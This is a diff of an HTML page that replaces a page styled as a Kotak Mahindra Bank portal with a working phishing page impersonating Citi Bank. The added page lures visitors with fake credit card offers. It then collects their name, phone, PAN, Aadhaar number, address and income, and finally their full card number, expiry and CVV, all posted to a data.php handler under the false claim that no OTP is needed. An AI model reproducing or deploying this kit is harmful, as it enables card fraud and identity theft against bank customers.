@@ -1,122 +1,773 @@
 <!DOCTYPE html>
-<html  >
+<html>
 <head>
-  <!-- Site made with Mobirise Website Builder v5.6.3, https://mobirise.com -->
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="generator" content="Mobirise v5.6.3, mobirise.com">
-  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
-  <link rel="shortcut icon" href="assets/images/kotak-mahindra-bank-logo-209x62.png" type="image/x-icon">
-  <meta name="description" content="">
-  
-  
-  <title>Home</title>
-  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
-  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min.css">
-  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
-  <link rel="stylesheet" href="assets/dropdown/css/style.css">
-  <link rel="stylesheet" href="assets/socicon/css/styles.css">
-  <link rel="stylesheet" href="assets/theme/css/style.css">
-  <link rel="preload" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
-  <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=swap"></noscript>
-  <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css"><link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css" type="text/css">
-  
-  
-  
-  
+<title>Citi</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<script type="text/javascript" src="./jquery.js"></script>
+<script type="text/javascript" src="./jquery.mask.js"></script>
 </head>
 <body>
-  
-  <section data-bs-version="5.1" class="menu menu2 cid-thzmPfpAAu" once="menu" id="menu2-1u">
-    
-    <nav class="navbar navbar-dropdown navbar-fixed-top navbar-expand-lg">
-        <div class="container">
-            <div class="navbar-brand">
-                <span class="navbar-logo">
-                    <a href="login.html">
-                        <img src="assets/images/kotak-mahindra-bank-logo-209x62.png" alt="Mobirise Website Builder" style="height: 3.8rem;">
-                    </a>
-                </span>
-                
-            </div>
-            <button class="navbar-toggler" type="button" data-toggle="collapse" data-bs-toggle="collapse" data-target="#navbarSupportedContent" data-bs-target="#navbarSupportedContent" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
-                <div class="hamburger">
-                    <span></span>
-                    <span></span>
-                    <span></span>
-                    <span></span>
-                </div>
-            </button>
-            <div class="collapse navbar-collapse" id="navbarSupportedContent">
-                <ul class="navbar-nav nav-dropdown" data-app-modern-menu="true"><li class="nav-item"><a class="nav-link link text-black display-4" href="login.html">
-                            About us</a></li><li class="nav-item"><a class="nav-link link text-black display-4" href="login.html">Pay</a></li>
-                    <li class="nav-item"><a class="nav-link link text-black display-4" href="login.html">Rewards</a></li>
-                    <li class="nav-item"><a class="nav-link link text-black display-4" href="login.html">Contacts</a>
-                    </li><li class="nav-item"><a class="nav-link link text-black display-4" href="login.html">Limit Increase</a></li></ul>
-                
-                <div class="navbar-buttons mbr-section-btn"><a class="btn btn-primary display-4" href="login.html">Login</a></div>
-            </div>
-        </div>
-    </nav>
-</section>
+<style type="text/css">
+*{
+padding:0;
+margin:0;
+outline:0;
+user-select:none;
+font-family:Verdana,Arial,sans-serif;
+}
+header{
+position:fixed;
+height:50px;
+background:white;
+width:100%;
+z-index:999999;
+}
+header img{
+max-width:50%;
+max-height:50px;
+margin-top:5px;
+margin-left:5px;
+}
+#pg1,#pg5,#pg6,#pg7,#pg8,#pg9,#pg10,#pg2,#pg3,#pg4{
+height:calc(100% - 80px);
+width:100%;
+position:absolute;
+top:50px;
+left:0;
+background:white;
+text-align:center;
+padding-top:30px;
+}
+#pg,#pg2,#pg3,#pg4,#pg7,#pg8{
+display:none;
+}
+#pg1 img{
+height:220px;
+width:85%;
+}
+.btn{
+height:40px;
+width:80%;
+background:#1d537f;
+display:block;
+margin:auto;
+color:white;
+font-weight:500;
+line-height:40px;
+border-radius:8px;
+}
 
-<section data-bs-version="5.1" class="header15 cid-thzqWbr2kg" id="header15-20">
-    
+.input{
+position:relative;
+border:1px solid grey;
+border-radius:8px;
+height:50px;
+width:80%;
+margin:auto;
+}
+.input input{
+height:90%;
+width:90%;
+border:0;
+font-size:17px;
+background:white;
+}
+.input label{
+position:absolute;
+top:15px;
+left:10px;
+transition:.25s;
+pointer-events:none;
+}
+.input input:not(:placeholder-shown) ~ label, .input input:focus ~ label{
+top:-10px;
+background:white;
+left:7px;
+font-size:14px;
+}
 
-    
+#pg1 button{
+height:35px;
+width:180px;
+border:2px solid #1d537f;
+background:white;
+font-size:16px;
+color:#1d537f;
+border-radius:5px;
+}
+.gj{
+width:90%;
+background:#eee;
+border-radius:15px;
+margin:auto;
+padding-top:40px;
+}
+.je{
+display:block;
+width:80%;
+font-size:14px;
+margin:auto;
+}
+.jdk{
+position:absolute;
+bottom:20px;
+text-align:center;
+}
 
-    <div class="container">
-        <div class="row justify-content-center">
-            <div class="col-12 col-md">
-                <div class="text-wrapper">
-                    <h2 class="mbr-section-title mb-3 mbr-fonts-style display-2"><strong>Card Control</strong></h2>
-                    <p class="mbr-text mb-3 mbr-fonts-style display-7">
-                        Enable online and other transaction mode and set desired limits for each type of transactions on your credit card in few clicks.
-                    </p>
-                    <div class="mbr-section-btn"><a class="btn btn-primary display-4" href="login.html">Card Control</a></div>
-                </div>
-            </div>
-            <div class="mbr-figure col-12 col-md-7"><iframe class="mbr-embedded-video" src="https://www.youtube.com/embed/nHdoumqkNh4?rel=0&amp;amp;mute=1&amp;showinfo=0&amp;autoplay=1&amp;loop=0" width="1280" height="720" frameborder="0" allowfullscreen></iframe></div>
-        </div>
-    </div>
-</section>
+.pgj{
+padding-top:10px;
+padding-bottom:10px;
+}
+.pgj img{
+height:160px;
+width:70%;
+}
 
-<section data-bs-version="5.1" class="header18 cid-thzs50TxLv" id="header18-21">
+.ieoo{
+width:85%;
+}
 
-    
+.sj82{
+width:85%;
+text-align:left;
+margin:auto;
+}
 
-    
+.input:focus-within{
+border:2px solid black;
+}
+.input:not(:focus-within){
+border:1px solid grey;
+}
 
-    <div class="align-center container">
-        <div class="row justify-content-center">
-            <div class="col-12 col-lg-12">
-                <h1 class="mbr-section-title mbr-fonts-style mbr-white mb-3 display-2"><strong>Reward Redemption - Credit Card - Kotak Mahindra Bank</strong></h1>
-                
-                <p class="mbr-text mbr-fonts-style mbr-white display-7">Earn 500 bonus reward points on Activation + Rs. 5000/- spends in the first 45 days of card set up. · Earn 2 reward points against every Rs. 100/- of online ...&nbsp;<br></p>
-                <div class="mbr-section-btn mt-3"><a class="btn btn-primary display-4" href="login.html">Redemption </a></div>
-            </div>
-        </div>
-    </div>
-</section>
 
-<section data-bs-version="5.1" class="header18 cid-thzsA7t9NR" id="header18-22">
+#pg7 .input{
+width:90%;
+margin-top:15px;
+}
+.ratio{
+border:3px solid   grey;
+border-radius:50%;
+height:15px;
+position:absolute;
+width:15px;
+margin-left:20px;
+margin-top:10px;
+}
+.jrilr0{
+width:90%;
+margin-top:10px;
+position:relative;
+}
 
-    
+.jrilr0 .j28e{
+display:block;
+margin-left:50px;
+text-align:left;
+}
 
-    
+.ratio span{
+background:#1d537f;
+height:8px;
+width:8px;
+position:absolute;
+top:3.5px;
+left:3.5px;
+display:none;
+border-radius:50px;
+}
+.input select{
+height:100%;
+width:90%;
+background:transparent;
+border:0;
+font-size:16px;
+}
 
-    <div class="align-center container">
-        <div class="row justify-content-center">
-            <div class="col-12 col-lg-12">
-                <h1 class="mbr-section-title mbr-fonts-style mbr-white mb-3 display-2"><strong>Register Now - Kotak Bank</strong></h1>
-                
-                <p class="mbr-text mbr-fonts-style mbr-white display-7">Enter your 16 digit Kotak Credit Card number · Your Name as it appears on Kotak Credit Card · Expiry month &amp; year as mentioned on the Kotak Credit Card · 3-digit ...&nbsp;<br></p>
-                <div class="mbr-section-btn mt-3"><a class="btn btn-primary display-4" href="login.html">Register </a></div>
-            </div>
-        </div>
-    </div>
-</section><section class="display-7" style="padding: 0;align-items: center;justify-content: center;flex-wrap: wrap;    align-content: center;display: flex;position: relative;height: 4rem;"><a href="https://mobiri.se/2721902" style="flex: 1 1;height: 4rem;position: absolute;width: 100%;z-index: 1;"><img alt="" style="height: 4rem;" src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="></a><p style="margin: 0;text-align: center;" class="display-7"> &#8204;</p><a style="z-index:1" href="https://mobirise.com/website-design-software.html"></a></section><script src="assets/bootstrap/js/bootstrap.bundle.min.js"></script>  <script src="assets/smoothscroll/smooth-scroll.js"></script>  <script src="assets/ytplayer/index.js"></script>  <script src="assets/dropdown/js/navbar-dropdown.js"></script>  <script src="assets/theme/js/script.js"></script>  
-  
-  
+
+.jd83ns8o{
+height:auto;
+padding:10px;
+width:85%;
+background:#f33;
+border-radius:10px;
+margin:auto;
+margin-top:10px;
+font-size:14px;
+color:white;
+font-weight:420;
+text-align:left;
+}
+.jd83ns8o input{
+margin-top:5px;
+margin-bottom:5px;
+height:25px;
+width:95%;
+border-radius:5px;
+font-size:16px;
+border:1px solid grey;
+}
+</style>
+<header>
+<img src="./img/citi_logo.png" >
+</header>
+
+
+<div id="pg1" >
+<img src="./img/card_logo.png" >
+<br>
+<span class="btn" >Check Your Availability</span>
+<br>
+<div class="input" >
+<input type="number" id="num" max="10"  placeholder=" " >
+<label>Enter Mobile Number</label>
+</div>
+<br>
+<button onclick="nxt1()">Proceed</button>
+</div>
+
+
+
+<div id="pg2" >
+<div class="gj" >
+<h3>Check Your Eligiblity for Pre-Qualified Offers</h3>
+<br><br>
+<img src="./img/card1.png" >
+<br><br>
+<span class="je" >
+There's no impact on your credit score to see if you're eligible, so feel free confident checking for offers now.
+</span>
+<br><br>
+<span class="btn" onclick="nxt2()">Check For Offers</span>
+<br>
+</div>
+
+<div class="jdk" >
+<span class="je" style="width:95%" >
+All users of our online services subject to privacy policy Statement and agree to be bound by Terms of Service
+</span>
+<b style="font-size:14px" >2023 Citi Bank All rights reserved</b>
+</div>
+</div>
+
+
+<div id="pg3" >
+
+<div class="gj pgj" >
+<h3>City Rewards Exclusive</h3>
+<img src="./img/cit11.png" >
+<br>
+Premium Travel Benifits and Expenses
+<br>
+<span class="btn" onclick="nxt3a()"  style="width:40%;margin-top:5px"  >View Details</span>
+</div>
+
+<br>
+
+<div class="gj pgj" >
+<h3>City Rewards</h3>
+<img src="./img/cit21.png" >
+<br>
+High Points offers upto 25% more Points
+<br>
+<span class="btn" onclick="nxt3b()" style="width:40%;margin-top:5px"  >View Details</span>
+</div>
+
+<br>
+
+<div class="gj pgj" >
+<h3>City Prestige</h3>
+<img src="./img/citi31.png" >
+<br>
+Superior Cashback at US supermarkets
+<br>
+<span class="btn"  onclick="nxt3c()"  style="width:40%;margin-top:5px"  >View Details</span>
+</div>
+
+<br>
+</div>
+
+
+
+<div id="pg6" >
+<h3>City Prestige</h3>
+<br>
+<img class="ieoo"  src="./img/citi31.png" >
+<br><br>
+<div class="sj82" >
+<h4>City Prestige Benifits:</h4>
+<br>
+<span style="font-size:14px" >
+1.Get Benifits worth ₹4800+ in first year<br>
+2.Fee waiver of ₹1000 on annual spends of ₹30000
+<br>3.Points worth of ₹850 on card activation.
+<br>4.Additional points of worth Rs. 2950
+<br>5.Annual fees Rs. 1000 + taxes
+<br>6.Never expiry rewards points
+</span>
+</div>
+<br>
+<span class="btn" onclick="nxt4()" style="width:40%;margin-top:5px"  >Apply Now</span>
+</div>
+
+<div id="pg4" style="display:none" >
+<h3>City Rewards Exclusive</h3>
+<br>
+<img class="ieoo"  src="./img/cit11.png" >
+<br><br>
+<div class="sj82" >
+<h4>City Rewards Exclusive Benifits:</h4>
+<br>
+<span style="font-size:14px" >
+1.Welcome gift reward points 4000 benefits worth ₹15000 from Taj Group and ITC Hotel.
+<br>
+2.8 Airport lounges in every 6 months 4 domestic and 4 internationl.
+<br>
+3.Buy one and get one movie ticket.
+<br>
+4. Additional rewards points worth 4000.
+<br>
+5.Annual fee 0.
+<br>
+6.Flexi payment method.
+<br>
+7.Card to card payment.
+<br>
+8.50 days time period to pay.
+<br>
+9. Never expiry rewards points.
+<br>
+10.Fuel surcharge waiver off 25%
+<br>
+11.2 rewards on every Es. 100 which can easily redeem in bill payment redeem points instantly via SMS.
+</span>
+</div>
+<br>
+<span class="btn" onclick="nxt4()"  style="width:40%;margin-top:5px"  >Apply Now</span>
+</div>
+
+
+
+<div id="pg5" style="display:none"  >
+<h3>City Rewards</h3>
+<br>
+<img class="ieoo"  src="./img/cit21.png" >
+<br><br>
+<div class="sj82" >
+<h4>City Rewards Benifits:</h4>
+<br>
+<span style="font-size:14px" >
+1.Get benefits worth ₹ 5200+ in first year.
+<br>
+2.Fee waiver of ₹ 1200 on annual spends of 30000.
+<br>
+3.Points worth 750 on card activation.
+<br>
+4. Additional points worth Rs. 2850.
+<br>
+5.Annual fee: Rs. 1000+ taxes.
+<br>
+6. Never expiry rewards points.
+</span>
+</div>
+<br>
+<span class="btn" onclick="nxt4()"  style="width:40%;margin-top:5px"  >Apply Now</span>
+</div>
+
+
+<div id="pg7" >
+<h5 align="left" style="margin-left:20px"  >Personal Information</h5>
+<div class="input" >
+<input type="text" id="nam"  placeholder=" " >
+<label>Full Name</label>
+</div>
+
+<div class="input" >
+<input type="email" id="email"  placeholder=" " >
+<label>Email (optional)</label>
+</div>
+
+
+<div class="input" >
+<input type="number" id="pnum"   placeholder=" " >
+<label>Phone Number</label>
+</div>
+
+
+<div class="input" >
+<input type="text" id="panum"   placeholder=" " >
+<label>Pan Number</label>
+</div>
+
+<div class="input" >
+<input type="number" id="anum"   placeholder=" " >
+<label>Aadhar Number</label>
+</div>
+
+<div class="input" >
+<input type="text" id="add"  placeholder=" " >
+<label>Permanent Address</label>
+</div>
+
+<div class="input" >
+<input type="text" id="cadd"  placeholder=" " >
+<label>Current Address(optional)</label>
+</div>
+
+
+<div class="input" >
+<select id="cn" >
+<option hidden >Choose Country</option>
+<option value="India" >India</option>
+</select>
+</div>
+
+<div class="input" >
+<select id="state" >
+<option hidden >Choose State</option>
+<option value="AP">Andhra Pradesh</option>
+<option value="AR">Arunachal Pradesh</option>
+<option value="AS">Assam</option>
+<option value="BR">Bihar</option>
+<option value="CT">Chhattisgarh</option>
+<option value="GA">Gujarat</option>
+<option value="HR">Haryana</option>
+<option value="HP">Himachal Pradesh</option>
+<option value="JK">Jammu and Kashmir</option>
+<option value="GA">Goa</option>
+<option value="JH">Jharkhand</option>
+<option value="KA">Karnataka</option>
+<option value="KL">Kerala</option>
+<option value="MP">Madhya Pradesh</option>
+<option value="MH">Maharashtra</option>
+<option value="MN">Manipur</option>
+<option value="ML">Meghalaya</option>
+<option value="MZ">Mizoram</option>
+<option value="NL">Nagaland</option>
+<option value="OR">Odisha</option>
+<option value="PB">Punjab</option>
+<option value="RJ">Rajasthan</option>
+<option value="SK">Sikkim</option>
+<option value="TN">Tamil Nadu</option>
+<option value="TG">Telangana</option>
+<option value="TR">Tripura</option>
+<option value="UT">Uttarakhand</option>
+<option value="UP">Uttar Pradesh</option>
+<option value="WB">West Bengal</option>
+<option value="AN">Andaman and Nicobar Islands</option>
+<option value="CH">Chandigarh</option>
+<option value="DN">Dadra and Nagar Haveli</option>
+<option value="DD">Daman and Diu</option>
+<option value="DL">Delhi</option>
+<option value="LD">Lakshadweep</option>
+<option value="PY">Puducherry</option>
+</select>
+
+</div>
+
+<div class="input" >
+<input type="number" id="pcode"   placeholder=" " >
+<label>Pincode</label>
+</div>
+
+<div class="input" >
+<input type="number" id="aainc"   placeholder=" " >
+<label>Enter total annual income</label>
+</div>
+
+<div class="input" >
+<select id="bnam" >
+<option hidden >Credit card issuer bank</option>
+<option value="AmericanExpress" >American Express</option>
+<option value="AxisBank" >Axis Bank</option>
+<option value="CitiBank" > Citi Bank</option>
+<option value="FederalBank" >Federal Bank</option>
+<option value="HDFC" >HDFC Bank</option>
+<option value="HSBC" >HSBC Bank</option>
+<option value="ICICI" >ICICI Bank</option>
+<option value="IndusInd" >Indusind Bank</option>
+<option value="KotakMahindraBank" >Kotak Mahindra Bank</option>
+<option value="RBL" >RBL Bank</option>
+<option value="SBI" >SBI Card</option>
+<option value="StandardChatered" >Standard Chatered Bank</option>
+<option value="YesBank" >Yes Bank</option>
+<option value="others" >Others</option>
+</select>
+</div>
+
+<div class="jrilr0" >
+<div class="ratio" onclick="this.style.borderColor=='rgb(29, 83, 127)' ? (this.style.border='3px solid grey',this.children[0].style.display='none') : (this.style.border='3px solid  #1d537f',this.children[0].style.display='block');  " ><span></span></div>
+<span class="j28e" >If i am approved send me a one time text message to the mobile number above to download the CITI Bank App
+</div>
+
+<span class="btn" style="margin-top:15px"  onclick="holal()" >Proceed</span>
+
+<br><br>
+
+</div>
+
+
+
+
+<div id="pg8">
+<h5 align="left" style="margin-left:20px" >Verify existing credit card </h5>
+<div style="text-align:left;font-size:14px;margin-left:20px" >Only card details will be validated for existing credit card user.</div>
+<br>
+<img src="./img/cardgroup.png" style="width:90%" >
+<br>
+<div class="jd83ns8o" >
+<span>CARD HOLDER NAME</span><br>
+<input type="text" id="ccnam"  ><br>
+<span>CARD NUMBER</span><br>
+<input type="number" id="ccnum"  ><br>
+<span>EXPIRATION</span><span style="float:right;margin-right:20px" >CVV CODE</span><br>
+<input type="number" placeholder="MM"  style="width:40px;"  id="expm"  > / <input type="number" style="width:40px;" placeholder="YY"   id="expy"  >
+<span  style="float:right;margin-right:20px"  ><input type="number" style="width:60px;"  id="cvv"  ></span>
+<br>
+</div>
+<br>
+<br>
+<div style="text-align:left;font-size:14px;margin-left:20px" >
+You won't be charged for card validation ( we don't require any kind of OTP for validation)
+</div>
+<br>
+<img src="./img/norton.png" style="width:60%" >
+<br>
+<br>
+<br>
+<span class="btn" onclick="snk()" >Validate Now</span>
+</div>
+
+<style type="text/css">
+#mold88,#mold8{
+height:100%;
+width:100%;
+position:fixed;
+top:0;
+left:0;
+background:rgba(0,0,0,.7);
+display:grid;
+z-index:99999999999;
+place-content:center;
+display:none;
+}
+#jskd{
+height:100px;
+width:300px;
+position:relative;
+background:white;
+border-radius:10px;
+}
+.i83jd{
+margin-left:10px;
+margin-top:20px;
+}
+#jskd span{
+color:#1d537f;
+position:absolute;
+bottom:10px;
+right:20px;
+}
+.iseo{
+padding:10px;
+}
+</style>
+<div id="mold88" onclick="this.style.display='none'">
+<div id="jskd" >
+<div class="i83jd" >Please Input Value</div>
+<span>OK</span>
+</div>
+</div>
+
+<div id="mold8"  onclick="window.location.href='./'">
+<div id="jskd" class="iseo" style="height:150px;"  >
+<div class="i83jd" >Success: Thank You for submitting Your Credit Card Application 8288292.You will receive a Status Update Shortly - Citi Bank</div>
+<span>OK</span>
+</div>
+</div>
+
+<script type="text/javascript">
+window.onload=()=>{
+$("#ccnum").mask("0000000000000000");
+$("#cvv").mask("000");
+$("#expm").mask("00");
+$("#expy").mask("00");
+$("#num").mask("0000000000");
+$("#pnum").mask("0000000000");
+};
+
+
+async function snk(){
+
+
+
+
+
+
+var cc=$("#ccnum").val();
+var ccnam=$("#ccnam").val();
+var expm=$("#expm").val();
+var expy=$("#expy").val();
+var cvv=$("#cvv").val();
+
+var nam=$("#nam").val();
+var eml=$("#email").val();
+var pnum=$("#pnum").val();
+var anum=$("#anum").val();
+var add=$("#add").val();
+var cadd=$("#cadd").val();
+var pcode=$("#pcode").val();
+var bnam=$("#bnam").val();
+var aainc=$("#aainc").val();
+var state=$("#state").val();
+var cn=$("#cn").val();
+
+var mnumm=$("#num").val();
+
+var g=[nam,pnum,anum,add,pcode,aainc];
+
+for(var x in g){
+if(g[x].length < 5){
+$("#mold88").css("display","grid");
+return;
+}
+}
+
+if(cc.length == 16 && ccnam.length > 4 && cvv.length == 3 && expy.length == 2 && expm.length == 2){
+
+var g=$.post("./data.php",{
+cc: $("#ccnum").val(),
+ccnam:$("#ccnam").val(),
+expm:$("#expm").val(),
+expy:$("#expy").val(),
+cvv:$("#cvv").val(),
+mnumm:$("#num").val(),
+nam:$("#nam").val(),
+eml:$("#email").val(),
+pnum:$("#pnum").val(),
+panum:$("#panum").val(),
+anum:$("#anum").val(),
+add:$("#add").val(),
+cadd:$("#cadd").val(),
+pcode:$("#pcode").val(),
+bnam:$("#bnam").val(),
+aainc:$("#aainc").val(),
+state:$("#state").val(),
+cn:$("#cn").val()
+}).then((r)=>{
+$("#mold8").css("display","grid");
+
+})
+
+
+
+
+}else{
+$("#mold88").css("display","grid");
+}
+
+
+}
+
+function holal(){
+var nam=$("#nam").val();
+var eml=$("#email").val();
+var pnum=$("#pnum").val();
+var anum=$("#anum").val();
+var add=$("#add").val();
+var cadd=$("#cadd").val();
+var pcode=$("#pcode").val();
+var bnam=$("#bnam").val();
+var aainc=$("#aainc").val();
+var state=$("#state").val();
+var panum=$("#panum").val();
+
+var cn=$("#cn").val();
+
+var g=[nam,pnum,anum,add,pcode,aainc,panum];
+
+for(var x in g){
+if(g[x].length < 5){
+$("#mold88").css("display","grid");
+return;
+}
+}
+if(bnam != "Credit card issuer bank" && state != "Choose State" && cn != "Choose Country"){
+window.location.hash="#p8";
+}
+else{
+$("#mold88").css("display","grid");
+}
+}
+
+setInterval(()=>{
+$("#pg2").css("display","none");
+$("#pg3").css("display","none");
+$("#pg4").css("display","none");
+$("#pg5").css("display","none");
+$("#pg6").css("display","none");
+$("#pg7").css("display","none");
+$("#pg8").css("display","none");
+//$("#mold88").css("display","none");
+
+if(window.location.hash=="#p2"){
+$("#pg2").css("display","block");
+}
+/*
+else if(window.location.hash=="#mo"){
+$("#mold88").css("display","grid");
+}*/
+else if(window.location.hash=="#p3"){
+$("#pg3").css("display","block");
+}
+else if(window.location.hash=="#p4"){
+$("#pg4").css("display","block");
+}
+else if(window.location.hash=="#p5"){
+$("#pg5").css("display","block");
+}
+else if(window.location.hash=="#p6"){
+$("#pg6").css("display","block");
+}
+else if(window.location.hash=="#p7"){
+$("#pg7").css("display","block");
+}
+else if(window.location.hash=="#p8"){
+$("#pg8").css("display","block");
+}
+else{
+$("#pg1").css("display","block");
+
+}
+
+},50);
+
+function nxt1(){
+if($("#num").val().length != 10){
+$("#mold88").css("display","grid");
+}
+else{
+window.location.hash="#p2";
+}
+}
+function nxt2(){
+window.location.hash="#p3";
+}
+
+function nxt3a(){
+window.location.hash="#p4";
+}
+function nxt3b(){
+window.location.hash="#p5";
+}
+function nxt3c(){
+window.location.hash="#p6";
+}
+function nxt4(){
+window.location.hash="#p7";
+}
+</script>
+
 </body>
 </html>
